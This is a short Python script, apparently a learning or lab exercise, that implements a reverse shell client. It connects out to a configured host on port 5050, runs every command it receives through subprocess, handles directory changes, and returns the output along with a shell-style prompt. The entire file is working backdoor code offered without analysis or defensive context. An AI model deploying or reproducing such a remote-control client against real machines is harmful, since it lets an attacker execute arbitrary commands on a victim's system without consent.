import os
import socket
import subprocess

PORT = 5050
# HOST = '192.168.43.33'
HOST = socket.gethostbyname(socket.gethostname())
ADDR = (HOST, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

while True:
    data = client.recv(2048)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        client.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)


client.close()